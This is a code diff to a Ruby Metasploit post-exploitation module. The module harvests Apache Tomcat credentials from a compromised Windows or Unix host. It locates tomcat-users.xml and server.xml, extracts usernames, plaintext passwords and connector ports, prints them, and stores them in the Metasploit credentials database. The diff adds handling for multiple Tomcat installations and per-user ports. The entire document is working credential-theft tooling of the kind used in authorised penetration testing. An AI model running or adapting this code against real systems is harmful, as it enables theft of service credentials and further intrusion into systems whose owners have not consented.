@@ -1,5 +1,3 @@
-require 'rex'
-require 'rexml/document'
 require 'msf/core'
 require 'msf/core/auxiliary/report'
 
@@ -25,7 +23,7 @@ class MetasploitModule < Msf::Post
 
 $username = Array.new
 $password = Array.new
-$port = 0
+$port = Array.new
 
   def report_creds(user, pass, port)
     return if (user.empty? or pass.empty?)
@@ -43,8 +41,8 @@ $port = 0
       credential_core = create_credential(credential_data)
 
       if not port.is_a? Integer
-        print_status("Port not an Integer")
         port = 8080
+        print_status("Port not an Integer, defaulting to port " + port.to_s + " for creds database")
       end
 
       login_data = {
@@ -62,14 +60,24 @@ $port = 0
 
   def gatherwin()
     print_status("Windows OS detected, enumerating services")
+    tomcatHomeArray = Array.new
     service_list.each do |service|
       if service[:name].downcase().include? "tomcat"
         print_good("Tomcat service found")
-        tomcat_home = service_info(service[:name])[:path].split("\\bin\\")[0]
-        conf_path = tomcat_home.split('"')[1] + "\\conf\\tomcat-users.xml"
+        tomcatHomeArray.push(service_info(service[:name])[:path].split("\\bin\\")[0])
+      end
+    end
+      
+    if tomcatHomeArray.size > 0
+      tomcatHomeArray.each do |tomcat_home|
+        if tomcat_home.include? '"'
+          tomcat_home = tomcat_home.split('"')[1]
+        end
+
+        conf_path = tomcat_home + "\\conf\\tomcat-users.xml"
 
         if exist?(conf_path)
-          print_status("tomcat-users.xml found")
+          print_status(conf_path + "found!")
           xml = read_file(conf_path).split("\n")
 
           comment_block = false
@@ -85,14 +93,18 @@ $port = 0
           end
         end
 
-        port_path = tomcat_home.split('"')[1] + "\\conf\\server.xml"
+        port_path = tomcat_home + "\\conf\\server.xml"
         if exist?(port_path)
           xml = read_file(port_path).split("\n")
         end
         comment_block = false
         xml.each do |line|
           if line.include? "<Connector" and not comment_block
-            $port = line.split('<Connector port="')[1].split('"')[0].to_i
+            i=0
+            while i < $username.count
+              $port.push(line.split('<Connector port="')[1].split('"')[0].to_i)
+              i+=1
+            end
           elsif line.include? ("<!--")
             comment_block = true
           elsif line.include? ("-->") and comment_block
@@ -100,22 +112,55 @@ $port = 0
           end
         end
       end
+    else
+      print_status("No Tomcat home can be determined")
     end
   end
 
   def gathernix()
     print_status("Unix OS detected")
     user_files = cmd_exec('locate tomcat-users.xml').split("\n")
-    user_files.each do |path|
-      if exist?(path) and not path.include? "tomcat8"
-          print_status("tomcat-users.xml found")
-          xml = read_file(path).split("\n")
+    if user_files.size > 0 
+      user_files.each do |path|
+        if exist?(path)
+            print_status(path + " found")
+            begin
+              xml = read_file(path).split("\n")
+            rescue
+              print_status("Cannot open " + path + " you probably don't have permission to open the file.")
+              break
+            end
 
+            comment_block = false
+            xml.each do |line|
+              if line.include? "<user username=" and not comment_block
+                $username.push(line.split('<user username="')[1].split('"')[0])
+                $password.push(line.split('password="')[1].split('"')[0])
+              elsif line.include? ("<!--")
+                comment_block = true
+              elsif line.include? ("-->") and comment_block
+                comment_block = false
+              end
+            end
+          end
+      end
+    else
+      print_status("No tomcat installation has been detected")
+    end
+
+    port_path = cmd_exec('locate server.xml').split("\n")
+    if port_path.size > 0 
+      port_path.each do |path|
+        if exist?(path) and path.include? "tomcat"
+          xml = read_file(path).split("\n")
           comment_block = false
           xml.each do |line|
-            if line.include? "<user username=" and not comment_block
-              $username.push(line.split('<user username="')[1].split('"')[0])
-              $password.push(line.split('password="')[1].split('"')[0])
+            if line.include? "<Connector" and not comment_block
+              i=0
+              while i < $username.count
+                $port.push(line.split('<Connector port="')[1].split('"')[0].to_i)
+                i+=1
+              end
             elsif line.include? ("<!--")
               comment_block = true
             elsif line.include? ("-->") and comment_block
@@ -123,23 +168,9 @@ $port = 0
             end
           end
         end
-    end
-
-    port_path = cmd_exec('locate server.xml').split("\n")
-    port_path.each do |path|
-      if exist?(path)
-          xml = read_file(path).split("\n")
-          comment_block = false
-          xml.each do |line|
-            if line.include? "<Connector" and not comment_block
-              $port = line.split('<Connector port="')[1].split('"')[0].to_i
-            elsif line.include? ("<!--")
-              comment_block = true
-            elsif line.include? ("-->") and comment_block
-              comment_block = false
-            end
-          end
       end
+    else
+      print_status("Failed to detect tomcat service port")
     end
   end
 
@@ -150,16 +181,21 @@ $port = 0
       gathernix()
     end
 
+  
+  if $username.size == 0
+    print_status("No user credentials have been found")
+  end
+
   i=0
   while i < $username.count
     print_good("Username and password found: " + $username[i] + ":" + $password[i])
-    report_creds($username[i],$password[i],$port)
+    report_creds($username[i],$password[i],$port[i])
     i+=1
   end
 
   $username = Array.new
   $password = Array.new
-  $port = 0
+  $port = Array.new
 
   end
 
